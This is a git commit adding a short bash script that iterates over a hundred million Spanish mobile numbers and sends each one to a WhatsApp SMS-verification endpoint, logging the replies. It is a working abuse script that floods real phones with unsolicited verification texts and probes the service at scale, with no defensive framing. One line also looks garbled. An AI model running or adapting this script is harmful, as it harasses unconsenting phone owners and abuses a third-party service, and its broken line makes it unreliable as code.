9c90ffc3ec015e29fa2bc1990ceb1717e3c24980
omarbv <bvomar@gmail.com>
2014-03-18 22:39:58 +0200

    script.sh

---
+++ script.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+let i=600000000
+let END=699999999
+echo "\n" > data
+while ((i<=END))
+do
+echo "[*] Mobile number: $i" >> data
+echo "[--- " >> data
+curl -d "method=sms&to=34$i&in=$i&cc=34&mcc=000&mnc=000" https://r.whatsapp.net/v1/code.php >> data
+let i++status="success-sent"
+echo "---]" >> data
+done
